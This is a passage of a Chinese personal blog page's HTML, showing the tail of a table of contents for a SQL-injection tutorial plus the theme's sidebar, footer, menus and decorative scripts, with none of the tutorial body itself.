toc-level-2"><a class="toc-link" href="#Floor"><span class="toc-number">3.12.</span> <span class="toc-text">Floor()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E7%A7%8D%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0"><span class="toc-number">3.13.</span> <span class="toc-text">十五种报错函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.14.</span> <span class="toc-text">布尔型盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.15.</span> <span class="toc-text">盲注一般步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">3.16.</span> <span class="toc-text">求数据库长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%9A%84ascii%E5%80%BC"><span class="toc-number">3.17.</span> <span class="toc-text">求数据库名的ascii值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">3.18.</span> <span class="toc-text">求表的数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E8%A1%A8%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">3.19.</span> <span class="toc-text">求表名的长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E8%A1%A8%E5%90%8D%E7%9A%84ascii%E5%80%BC"><span class="toc-number">3.20.</span> <span class="toc-text">求表名的ascii值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%88%97%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">3.21.</span> <span class="toc-text">求列的数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%88%97%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">3.22.</span> <span class="toc-text">求列名的长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%88%97%E5%90%8D%E5%AF%B9%E5%BA%94%E7%9A%84ascii%E5%80%BC"><span class="toc-number">3.23.</span> <span class="toc-text">求列名对应的ascii值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%AD%97%E6%AE%B5%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">3.24.</span> <span class="toc-text">求字段的数量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">3.25.</span> <span class="toc-text">求字段内容的长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%82%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E5%AF%B9%E5%BA%94%E7%9A%84ascii%E5%80%BC"><span class="toc-number">3.26.</span> <span class="toc-text">求字段内容对应的ascii值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.27.</span> <span class="toc-text">时间型盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87%E4%B9%8B%E9%81%93"><span class="toc-number">3.28.</span> <span class="toc-text">WAF绕过之道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#D-SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">D.SQL注入工具使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#E-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">5.</span> <span class="toc-text">E.SQL注入防御措施</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/23/hw/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89/" title="跨站脚本攻击（XSS）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="跨站脚本攻击（XSS）"/></a><div class="content"><a class="title" href="/2024/04/23/hw/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89/" title="跨站脚本攻击（XSS）">跨站脚本攻击（XSS）</a><time datetime="2024-04-22T17:01:15.000Z" title="发表于 2024-04-23 01:01:15">2024-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2024-04-22T17:00:52.000Z" title="发表于 2024-04-23 01:00:52">2024-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/06/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%20%E8%AF%A6%E8%A7%A3%EF%BC%81/" title="原码、反码、补码 详解！"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="原码、反码、补码 详解！"/></a><div class="content"><a class="title" href="/2024/04/06/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%20%E8%AF%A6%E8%A7%A3%EF%BC%81/" title="原码、反码、补码 详解！">原码、反码、补码 详解！</a><time datetime="2024-04-06T14:40:37.000Z" title="发表于 2024-04-06 22:40:37">2024-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/05/RHCSA/" title="RHCSA"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RHCSA"/></a><div class="content"><a class="title" href="/2024/04/05/RHCSA/" title="RHCSA">RHCSA</a><time datetime="2024-04-05T10:38:43.000Z" title="发表于 2024-04-05 18:38:43">2024-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/05/HCIP/" title="HCIP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HCIP"/></a><div class="content"><a class="title" href="/2024/04/05/HCIP/" title="HCIP">HCIP</a><time datetime="2024-04-05T10:38:26.000Z" title="发表于 2024-04-05 18:38:26">2024-04-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-上班摸鱼中.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://www.dogecloud.com/" style="margin-inline:5px" data-title="本站使用多吉云为静态资源提供CDN加速" title="本站使用多吉云为静态资源提供CDN加速"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/CDN-多吉云-3693F3.svg" alt="本站使用多吉云为静态资源提供CDN加速"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="渊" target="_blank">渊</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">83</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">22</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://index.anheyu.com/" title="个人主页"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/13/64d8c2748ef34.jpg" alt="个人主页"/><span class="back-menu-item-text">个人主页</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://updateyuan.github.io/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Anaconda/" style="font-size: 0.88rem;">Anaconda<sup>10</sup></a><a href="/tags/Android/" style="font-size: 0.88rem;">Android<sup>2</sup></a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">C语言<sup>1</sup></a><a href="/tags/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" style="font-size: 0.88rem;">FAT32文件系统<sup>2</sup></a><a href="/tags/HCIP/" style="font-size: 0.88rem;">HCIP<sup>2</sup></a><a href="/tags/JAVA%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/" style="font-size: 0.88rem;">JAVA程序设计<sup>3</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>5</sup></a><a href="/tags/MacOS/" style="font-size: 0.88rem;">MacOS<sup>1</sup></a><a href="/tags/Python/" style="font-size: 0.88rem;">Python<sup>2</sup></a><a href="/tags/SQL/" style="font-size: 0.88rem;">SQL<sup>3</sup></a><a href="/tags/VMware-Workstation/" style="font-size: 0.88rem;">VMware-Workstation<sup>1</sup></a><a href="/tags/Web/" style="font-size: 0.88rem;">Web<sup>1</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>1</sup></a><a href="/tags/Winhex/" style="font-size: 0.88rem;">Winhex<sup>7</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>13</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>10</sup></a><a href="/tags/%E4%B8%93%E5%8D%87%E6%9C%AC/" style="font-size: 0.88rem;">专升本<sup>1</sup></a><a href="/tags/%E5%8A%9E%E5%85%AC%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size: 0.88rem;">办公自动化<sup>1</sup></a><a href="/tags/%E5%8D%8E%E4%B8%BA/" style="font-size: 0.88rem;">华为<sup>2</sup></a><a href="/tags/%E5%8D%8E%E4%B8%BA1-X/" style="font-size: 0.88rem;">华为1+X<sup>8</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">基础<sup>5</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/" style="font-size: 0.88rem;">基础教程<sup>33</sup></a><a href="/tags/%E5%A4%A7%E5%AD%A6/" style="font-size: 0.88rem;">大学<sup>3</sup></a><a href="/tags/%E5%B1%80%E5%9F%9F%E7%BD%91%E7%BB%84%E5%BB%BA%E4%B8%8E%E7%BB%B4%E6%8A%A4/" style="font-size: 0.88rem;">局域网组建与维护<sup>2</sup></a><a href="/tags/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/" style="font-size: 0.88rem;">应用密码技术<sup>3</sup></a><a href="/tags/%E6%80%9D%E7%A7%91/" style="font-size: 0.88rem;">思科<sup>2</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 0.88rem;">操作系统<sup>1</sup></a><a href="/tags/%E6%95%B0%E5%AD%A6/" style="font-size: 0.88rem;">数学<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D/" style="font-size: 0.88rem;">数据恢复<sup>13</sup></a><a href="/tags/%E6%9B%B4%E6%96%B0/" style="font-size: 0.88rem;">更新<sup>13</sup></a><a href="/tags/%E6%9D%82%E8%AE%B0/" style="font-size: 0.88rem;">杂记<sup>1</sup></a><a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 0.88rem;">爬虫<sup>10</sup></a><a href="/tags/%E7%A1%AC%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%B8%88/" style="font-size: 0.88rem;">硬件工程师<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 0.88rem;">网络<sup>4</sup></a><a href="/tags/%E7%BE%8E%E5%8C%96/" style="font-size: 0.88rem;">美化<sup>13</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">计算机基础<sup>1</sup></a></div></div><hr/></div></div><div id="keyboard-tips"><div class="keyboardTitle">博客快捷键</div><div class="keybordList"><div class="keybordItem"><div class="keyGroup"><div class="key">shift K</div></div><div class="keyContent"><div class="content">关闭快捷键功能</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift A</div></div><div class="keyContent"><div class="content">打开/关闭中控台</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift M</div></div><div class="keyContent"><div class="content">播放/暂停音乐</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift D</div></div><div class="keyContent"><div class="content">深色/浅色显示模式</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift S</div></div><div class="keyContent"><div class="content">站内搜索</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift R</div></div><div class="keyContent"><div class="content">随机访问</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift H</div></div><div class="keyContent"><div class="content">返回首页</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift F</div></div><div class="keyContent"><div class="content">友链鱼塘</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift L</div></div><div class="keyContent"><div class="content">友链页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift P</div></div><div class="keyContent"><div class="content">关于本站</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift I</div></div><div class="keyContent"><div class="content">原版/本站右键菜单</div></div></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

